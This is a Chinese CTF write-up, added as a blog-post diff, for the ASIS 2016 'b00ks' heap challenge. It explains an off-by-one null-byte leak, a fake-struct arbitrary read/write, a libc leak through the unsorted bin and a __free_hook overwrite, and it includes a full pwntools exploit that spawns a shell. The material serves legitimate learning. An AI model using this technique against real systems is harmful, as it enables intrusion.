@@ -1,0 +1,269 @@
+export const layout = "#components/Page.js";
+export const title = "AsisCTF2016 b00ks 复现笔记";
+export const created = "2024-01-23T00:25:35+08:00";
+
+# 记一道 offbyone 堆题的复现、反思与总结
+
+## 复现
+
+### 题目介绍
+
+[题目链接](https://buuoj.cn/challenges#asis2016_b00ks)
+
+菜单题，选单如下，其中 create 功能会创建一个 book，edit 功能只能修改 book 的 description，print 功能会打印 book 的 id/name/description/author, delete 功能会 free 掉 book name/book description/book self ：
+
+```
+1. Create a book
+2. Delete a book
+3. Edit a book
+4. Print book detail
+5. Change current author name
+6. Exit
+```
+
+题目每创建一个 book，会涉及到两个用于维护的数据结构：一个是 book struct 本身，一个是 book list。
+
+book struct 结构如下，每个 book struct 耗用内存空间大小为 0x20：
+
+```c
+struct book {
+    int id;
+    char *name;
+    char *description;
+    int size;
+}
+```
+
+book list 则是用来存放 book 的数组，主要用在 `delete a book` 和 `edit a book` 功能中。
+
+注意到程序自己实现了一个输入函数 `input`：
+
+```c
+__int64 __fastcall input(char *target, int len)
+{
+    int i; // [rsp+14h] [rbp-Ch]
+
+    if ( len <= 0 )
+        return 0LL;
+    for ( i = 0; ; ++i )
+    {
+        if ( read(0, target, 1uLL) != 1 )
+            return 1LL;
+        if ( *target == '\n' )
+            break;
+        ++target;
+        if ( i == len )
+            break;
+    }
+    *target = 0;
+    return 0LL;
+}
+```
+
+以及它的一个引用：
+
+```c
+__int64 read_author()
+{
+    printf("Enter author name: ");
+    if ( !input(author, 32LL) )
+        return 0LL;
+    printf("fail to read author_name");
+    return 1LL;
+}
+```
+
+注意一下：这个 `input` 函数的逻辑是，先读入一个字符，数组下标加一，检查已读入字符的长度，如果未达到 `len`，则继续读入；如果读入换行符，则退出循环并将换行符所在的位置置为 0。
+
+因此，如果当 `input(author, 32LL)`，会触发一个 off by one 漏洞：假设输入 `"a" * 32 + '\n'` 时，`input`函数一定会将 `target[32]` （ target 0 ~ 31 是共计 32 个 'a'）置为 `\x00`。
+
+这是 off by one in heap 的一个常见漏洞，即利用 Null byte 进行攻击。
+
+这个题目附件的保护除了 canary 是开满的，我们需要利用 Null byte off by one 泄漏一些东西。
+
+继续看，注意到 `create` 函数里会将创建好的 book struct 放在 book list 里：
+
+```c
+if ( b ) {
+    b->size = size;                     // book name size
+    *(pos + v2) = b;
+    b->description = ptr2;              // book description
+    b->name = ptr;                      // book name
+    b->id = ++id;                       // book id
+    return 0LL;
+}
+```
+
+而 book list 的起始位置非常敏感，双击跟进去发现它的位置是 `unk_202060`，而 author 的位置是 `unk_202040`，而我们 read_author 函数正好可以读入一个 0x20 的字符串，而 book list 的起始位置（即 book1 的地址）和这个 author name 之间并没有空字符，通过功能 4 print the book detail 可以直接泄漏 book1，一个堆指针。
+
+```bash
+pwndbg> x/16gx $rebase(0x202020+32)
+0x5a7b29802040: 0x6161616161616161                        0x6161616161616161
+0x5a7b29802050: 0x6161616161616161                        0x6261616161616161 <=== author name
+0x5a7b29802060: 0x00005a7b29f7b130 <=== the book1 addr    0x0000000000000000
+              
+```
+
+另一个很重要的点是，`create` 时 book 的 `name_size` 和 `description_size` 都是完全可控的，并且，chunk 的申请顺序是先 `malloc name`，再 `malloc description`，最后 `malloc book struct`。
+
+由于我们只能将 author 的后一位置为 `0`，也就是将 book1_addr 的低 byte 置为 `0`，而 edit book 功能又只能修改 description，只有通过构造恰当的 book name size，才能利用 description 指针构造 fake book1 做到任意地址读写。注意：book1 的 description 会被用来构造 fake book1，因此其大小必须为 0x20，因此只能调整 book name size。
+
+调试发现，当 name size 为 0x80 时，`book1->description` 恰好为一个最低一字节全为 0 的地址，而这个地址所指向的内容是可以由 edit 功能任意修改的，故可以将其布置为一个 fake book1，其 name/descriton 全部由攻击者掌控。此时我们再调用一次 `read_author`， 即可覆盖 book1 最低字节为 0，而被覆盖后的地址恰好是原来 book 的 description，从而成功伪造一个完全可控的 fake book。
+
+到这里，我们就成功拿到了任意地址读写，接下来只要泄漏 libc base，打一个 free hook 就可以了。
+
+如何泄漏 libc base 呢？一个想法是申请一个非常大的 chunk，这个 chunk 由于过大，会撞到内存映射区，因此无法用 `(s)brk` 而只能用 `mmap` 申请。而 `mmap` 申请 arena 的内存与的 libc 的偏移是固定的，通过调试可以得出这个偏移值，只要读这个超级大 chunk 的地址，就可以拿到 libc base。
+
+这个想法不太可行，很多师傅的 wp 都反映会出现本地通远程不通的情况，甚至我这里本地都不通（（
+
+另一个想法是利用 unsort bin attack 泄漏 `fd` 指针，这个想法也比较简单，先 create 一个 name 和 description 都大于 80 bytes 的 book，然后 free 掉，这个 chunk 会被扔进 unsort bin 里，其 fd_addr 与 book1_addr 的偏移是固定的为 0x30，然后利用 `fd` 与 arena 存在固定偏移以及 arena 在 libc 全局符号表内，得出 libc base。
+
+泄漏出 libc base 之后的 free hook 是没有难点的。
+
+### 攻击流程
+
+申请 3 个 book，book2 free 掉用来打 unsort bin attack，book1 伪造 fake book1，fake book1 的 name 布置为 book2->fd，其 description 指向 book3 的 description，前者 edit 为 `__free_hook`，后者 edit 为 `system`，然后 delete book3 即可执行 `system("/bin/sh")`。
+
+### exp
+
+```py
+from pwn import *
+
+proc = "b00ks"
+context.binary = proc
+io = process(proc)
+# io = remote("node5.buuoj.cn", 29264)
+libc = ELF("libc.so.6")
+
+if args.G:
+    gdb.attach(io)
+  
+def option(index: int):
+    io.recvuntil(b"> ", drop=True)
+    io.sendline(str(index).encode())
+
+def create_book(name_size: int, book_name: bytes, des_size: int, des: bytes):
+    option(1)
+    io.recvuntil(b"\nEnter book name size: ", drop=True)
+    io.sendline(str(name_size).encode())
+    io.recvuntil(b"Enter book name (Max 32 chars): ", drop=True)
+    io.sendline(book_name)
+    io.recvuntil(b"\nEnter book description size: ", drop=True)
+    io.sendline(str(des_size).encode())
+    io.recvuntil(b"Enter book description: ", drop=True)
+    io.sendline(des)
+
+def delete_book(index: int):
+    option(2)
+    io.recvuntil(b"Enter the book id you want to delete: ", drop=True)
+    io.sendline(str(index).encode())
+
+def edit_book(index: int, des: bytes):
+    option(3)
+    io.recvuntil(b"Enter the book id you want to edit: ", drop=True)
+    io.sendline(str(index).encode())
+    io.recvuntil(b"Enter new book description: ", drop=True)
+    io.sendline(des)
+  
+def print_book(index: int) -> tuple:
+    option(4)
+    for i in range(index):
+        io.recvuntil(b"ID: ", drop=True)
+        idx: int = int(io.recvuntil(b"\n", drop=True).decode())
+        io.recvuntil(b"Name: ", drop=True)
+        name: bytes = io.recvuntil(b"\n", drop=True)
+        io.recvuntil(b"Description: ", drop=True)
+        description: bytes = io.recvuntil(b"\n", drop=True)
+        io.recvuntil(b"Author: ", drop=True)
+        author: bytes = io.recvuntil(b"\n", drop=True)
+    return idx, name, description, author
+
+def change_name(author: bytes):
+    option(5)
+    io.recvuntil(b"Enter author name: ", drop=True)
+    io.sendline(author)
+
+io.recvuntil(b"Enter author name: ", drop=True)
+io.sendline(b"a" * 31 + b"b")
+
+create_book(0xd0, b"aaa", 0x20, b"bbb")
+create_book(0x80, b"ccc", 0x80, b"ddd")
+create_book(0x20, b"/bin/sh", 0x20, b"/bin/sh")
+delete_book(2)
+
+idx, name, description, author = print_book(1)
+book1_addr = u64(author[32:].ljust(8, b"\x00"))
+log.info(f"book1_addr ===> {hex(book1_addr)}\n")
+
+edit_book(1, flat([1, book1_addr + 0x30, book1_addr + 0x30 + 0x90 + 0x130, 0xffff]))
+change_name(b"a" * 32)
+
+idx, name, description, author = print_book(1)
+fd_addr = u64(name.ljust(8, b"\x00"))
+libc_base = fd_addr - 0x10 - 88 - libc.symbols["__malloc_hook"]
+free_hook_addr = libc_base + libc.symbols["__free_hook"]
+system_addr = libc_base + libc.symbols["system"]
+log.info(f"fd_addr ===> {hex(fd_addr)}\nlibc_base ===> {hex(libc_base)}\nfree_hook_addr ===> {hex(free_hook_addr)}\n")
+log.info(f"system_addr ===> {hex(system_addr)}\n")
+
+edit_book(1, p64(free_hook_addr) + b"\x20") # 注意要避免把 book3 size 置 0，否则下一步无法修改 book3 description.
+edit_book(3, p64(system_addr))
+# input()
+delete_book(3)
+
+io.interactive()
+```
+
+## 反思
+
+讲几个做这道题时遇到的知识点。
+
+### $Q_{1}$: C 语言中如何计算 struct 结构的内存大小？
+
+$A_{1}$: 一开始是看 wiki 的时候，不太理解那个 book struct 的内存大小为啥是 0x20 bytes，越想越不对劲，去搜了一下发现还是字节对齐的锅。
+
+字节对齐是为了提高内存访问的效率与速度，它的细节和编译器实现有关，但一般而言，遵循以下规则：
+
+1. 结构体变量的首地址是结构体中最宽基本类型成员的大小的倍数；
+2. 结构体每个成员相对于结构体首地址的偏移量都是该成员内存大小的整数倍，也就是说相邻的两个不同类型的成员之间可能需要填充字节，填充至相邻两成员的最小公倍数；
+3. 结构体所占的总内存大小应为结构体中最宽基本类型成员的倍数，也就是可能在最后一个成员之后填充字节。
+
+注意：结构体不算作基本类型成员。
+
+按照这个规则，可以得出以下结构体所占的内存为 24 字节：
+
+```c
+struct node {
+    char a; // 1 字节，但会填充至 4 字节
+    int b; // 4 字节，至此共 8 字节，与 long long 相同，不需要填充
+    long long c; // 8 字节，至此共 16 字节
+    char d; // 1 字节，至此共 17 字节
+    // 结构体总大小必须为 8 的整数倍，所以填充至 24 字节
+};
+```
+
+### $Q_{2}$: 逆向中如何用 IDA 分析复杂结构体？
+
+$A_2$：算是一个可以加速逆向分析的小 trick，毕竟一堆指针偏移看起来还是挺烦躁的。
+
+- 首先打开 IDA，使用快捷键 Shift+F1 打开本地类型窗口。
+- 按下 insert 快捷键，弹出类型声明窗口，在该窗口的编辑区域以 C 语言语法定义结构体。
+- 输入定义的结构体。
+- 双击我们想要导入的结构体，选择导入结构体。
+- 点击 OK 后 IDA 会自动解析我们定义的结构体。
+
+具体细节参考[这篇文章](https://bbs.kanxue.com/thread-266419.htm#msg_header_h1_2)和[这篇文章](https://thinkycx.me/2019-07-15-how-to-create-structs-in-IDA.html)。
+
+关于 ida 中 db, dw, dd, dq 分别是什么含义，可以看[这个](https://www.tortall.net/projects/yasm/manual/html/nasm-pseudop.html)
+
+### $Q_3$: 如何正确使用 patchelf?
+
+$A_3$：先叠个甲，真不是我不读 readme，我前前后后把 patchelf repo readme 读了三四遍，这 b 文档连个示例都没有，我也不知道该用绝对路径还是相对路径，相对路径的话该不该加 ./ 这种东西，绝对路径的话是从家目录开始还是从根目录开始，太抽象了。。。
+
+然后顶着 csdn 的恶臭味找了篇[教程](https://blog.csdn.net/llovewuzhengzi/article/details/134234465)，你别说。
+
+## 总结
+
+这道题目综合考察的知识点还是比较多的，涉及到 off by one 在堆中的利用，绕过 "\\x00" 截断，利用 mmap 泄漏 libc，unsort bin attack 和 free hook，还有一些其他乱七八糟的东西。记录这道题目的目的也是为了完全搞懂这些知识点，全部弄清楚。
+
+寒假开始正式接触堆了，数据结构会更复杂，奇奇怪怪的本地通远程不通等等玄学问题，调也调不明白，就顶着压力嗯调，遇到一些小 trick 记录于此，方便日后复习。
